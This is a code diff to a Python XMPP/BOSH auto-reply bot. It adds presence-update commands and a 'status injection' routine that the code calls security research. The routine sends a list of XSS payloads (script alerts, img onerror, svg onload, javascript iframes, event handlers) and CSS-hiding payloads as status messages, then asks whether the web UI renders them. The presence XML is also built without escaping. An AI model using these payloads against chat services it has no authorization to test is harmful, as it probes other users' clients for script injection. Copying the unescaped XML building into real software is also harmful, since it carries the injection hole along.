@@ -211,6 +211,126 @@ class XMPPAutoReplyBot:
         except Exception as e:
             print(f"❌ Failed to set presence: {e}")
 
+    def update_presence(self, show_state=None, status_message=None, priority=None):
+        """Update presence with custom show state and status message"""
+        if not self.sid:
+            print("❌ Cannot update presence - not connected")
+            return False
+        
+        # Use current values as defaults
+        current_priority = priority if priority is not None else 10
+        
+        rid = self.rid_manager.next_rid()
+        
+        # Build presence XML dynamically
+        presence_elements = []
+        
+        if priority is not None:
+            presence_elements.append(f"<priority>{priority}</priority>")
+        else:
+            presence_elements.append(f"<priority>{current_priority}</priority>")
+        
+        if show_state:
+            presence_elements.append(f"<show>{show_state}</show>")
+        
+        if status_message:
+            presence_elements.append(f"<status>{status_message}</status>")
+        
+        presence_content = "\n    ".join(presence_elements)
+        
+        presence_body = f"""
+        <body rid='{rid}' sid='{self.sid}' xmlns='http://jabber.org/protocol/httpbind'>
+          <presence xmlns='jabber:client'>
+            {presence_content}
+          </presence>
+        </body>
+        """
+        
+        print(f"[DEBUG] Updating presence...")
+        print(f"[DEBUG] Show: {show_state}")
+        print(f"[DEBUG] Status: {status_message}")
+        print(f"[DEBUG] Priority: {current_priority}")
+        
+        try:
+            presence_resp = self.session.post(BOSH_URL, data=presence_body.strip())
+            presence_resp.raise_for_status()
+            print("[+] Presence updated successfully")
+            print(f"[DEBUG] Server response: {presence_resp.text}")
+            return True
+        except Exception as e:
+            print(f"❌ Failed to update presence: {e}")
+            return False
+
+    def test_status_injection(self):
+        """Test various status message payloads for security research"""
+        print("\n🧪 *** STATUS INJECTION TESTING ***")
+        print("Testing various payloads to investigate web UI rendering...")
+        
+        test_payloads = [
+            # Basic tests
+            ("text", "🤖 Basic Bot Status"),
+            ("emoji", "🟢🔥⚡ Emoji Test ⚠️💀🚨"),
+            
+            # HTML tests
+            ("html_bold", "<b>Bold Bot Status</b>"),
+            ("html_italic", "<i>Italic Bot Status</i>"),
+            ("html_span", "<span style='color:red'>Red Bot Status</span>"),
+            
+            # Event handler tests
+            ("onclick", "<span onclick='alert(\"XSS Test\")'>Click Me Bot</span>"),
+            ("onmouseover", "<span onmouseover='console.log(\"Hover Test\")'>Hover Bot</span>"),
+            
+            # Script injection tests
+            ("script", "<script>console.log('Script Test')</script>Bot"),
+            ("script_alert", "<script>alert('XSS Alert')</script>"),
+            
+            # CSS injection tests
+            ("css_style", "<style>body{background-color:red!important}</style>Bot"),
+            ("css_hide", "<style>.user-list{display:none!important}</style>"),
+            
+            # Advanced tests
+            ("iframe", "<iframe src='javascript:alert(\"iframe\")'></iframe>Bot"),
+            ("img_onerror", "<img src=x onerror=alert('img_error')>Bot"),
+            ("svg", "<svg onload=alert('svg_load')></svg>Bot"),
+            
+            # Unicode escape tests
+            ("unicode", "\\u003cscript\\u003ealert('unicode')\\u003c/script\\u003e"),
+        ]
+        
+        results = []
+        
+        for test_name, payload in test_payloads:
+            print(f"\n[TEST] {test_name}: {payload}")
+            
+            success = self.update_presence(show_state="online", status_message=payload)
+            
+            if success:
+                print(f"✅ Payload accepted by server")
+                user_input = input(f"Check web UI. Does '{test_name}' render as HTML/JS? (y/n/skip): ").lower()
+                
+                if user_input == 'y':
+                    results.append((test_name, payload, "VULNERABLE - Renders as HTML/JS"))
+                    print("🚨 POTENTIAL VULNERABILITY DETECTED!")
+                elif user_input == 'n':
+                    results.append((test_name, payload, "Safe - Rendered as text"))
+                else:
+                    results.append((test_name, payload, "Skipped"))
+                    
+                # Brief pause between tests
+                time.sleep(1)
+            else:
+                results.append((test_name, payload, "Server rejected"))
+                print(f"❌ Server rejected payload")
+        
+        # Summary report
+        print("\n📊 *** INJECTION TEST RESULTS ***")
+        for test_name, payload, result in results:
+            print(f"{test_name}: {result}")
+            if "VULNERABLE" in result:
+                print(f"  Payload: {payload}")
+        
+        return results
+
     def is_self_message(self, from_jid):
         """Check if a message is from the bot itself to prevent infinite loops"""
         if not self.jid:
@@ -342,7 +462,8 @@ class XMPPAutoReplyBot:
                     
                     if body_text and from_jid:
                         # CRITICAL: Filter out self-messages to prevent infinite loops
-                        if self.is_self_message(from_jid):
+                        # BUT allow commands that start with '/' for interactive control
+                        if self.is_self_message(from_jid) and not body_text.startswith('/'):
                             print(f"[DEBUG] *** FILTERING SELF-MESSAGE ***")
                             print(f"[DEBUG] Message from: {from_jid}")
                             print(f"[DEBUG] Our JID: {self.jid}")
@@ -491,6 +612,67 @@ class XMPPAutoReplyBot:
         
         print("[DEBUG] Polling worker thread stopped")
 
+    def process_user_command(self, command_text):
+        """Process interactive commands from user input"""
+        parts = command_text.strip().split(' ', 2)
+        command = parts[0].lower()
+        
+        if command == '/status':
+            if len(parts) < 2:
+                print("Usage: /status <message>")
+                return
+            status_message = ' '.join(parts[1:])
+            success = self.update_presence(status_message=status_message)
+            if success:
+                print(f"✅ Status updated to: '{status_message}'")
+            else:
+                print("❌ Failed to update status")
+                
+        elif command == '/show':
+            if len(parts) < 2:
+                print("Usage: /show <state> [status_message]")
+                print("Valid states: online, away, dnd, chat, xa")
+                return
+            show_state = parts[1]
+            status_message = ' '.join(parts[2:]) if len(parts) > 2 else None
+            success = self.update_presence(show_state=show_state, status_message=status_message)
+            if success:
+                print(f"✅ Show state updated to: '{show_state}'" + 
+                      (f" with status: '{status_message}'" if status_message else ""))
+            else:
+                print("❌ Failed to update presence")
+                
+        elif command == '/test':
+            print("🧪 Starting security injection tests...")
+            self.test_status_injection()
+            
+        elif command == '/priority':
+            if len(parts) < 2:
+                print("Usage: /priority <number>")
+                return
+            try:
+                priority = int(parts[1])
+                success = self.update_presence(priority=priority)
+                if success:
+                    print(f"✅ Priority updated to: {priority}")
+                else:
+                    print("❌ Failed to update priority")
+            except ValueError:
+                print("❌ Priority must be a number")
+                
+        elif command == '/help':
+            print("\n🤖 Available Commands:")
+            print("/status <message>     - Set status message")
+            print("/show <state> [msg]  - Set show state (online/away/dnd/chat/xa)")
+            print("/priority <number>   - Set presence priority")
+            print("/test                - Run security injection tests")
+            print("/help                - Show this help")
+            print()
+            
+        else:
+            print(f"❌ Unknown command: {command}")
+            print("Type /help for available commands")
+
     def message_processor(self):
         """Message processing worker thread - handles auto-replies immediately"""
         print("[DEBUG] Starting message processor thread...")
@@ -510,6 +692,13 @@ class XMPPAutoReplyBot:
                 print(f"ID: {message['id']}")
                 print(f"Receipt requested: {message['receipt_requested']}")
                 print(f"Timestamp: {message['timestamp']}")
+                
+                # Check if this is a command from our own JID (for interactive control)
+                if self.is_self_message(message['from']) and message['body'].startswith('/'):
+                    print("[DEBUG] Processing self-command...")
+                    self.process_user_command(message['body'])
+                    self.message_queue.task_done()
+                    continue
                 
                 # Send receipt if requested (immediate)
                 if message['receipt_requested']:
@@ -566,6 +755,13 @@ class XMPPAutoReplyBot:
             print("📡 Polling thread: Continuous BOSH polling in background")
             print("⚡ Processor thread: Immediate auto-reply processing")
             print("🔥 Expected response time: ~2 seconds (configured delay)")
+            print("\n🤖 *** INTERACTIVE PRESENCE COMMANDS ***")
+            print("Send yourself messages starting with '/' to control presence:")
+            print("  /status <message>     - Set status message")
+            print("  /show <state> [msg]  - Set show state (online/away/dnd/chat/xa)")
+            print("  /priority <number>   - Set presence priority")
+            print("  /test                - Run security injection tests")
+            print("  /help                - Show all commands")
             print("\n[+] Bot is now ready for immediate auto-replies!")
             print("[+] Press Ctrl+C to stop")
             
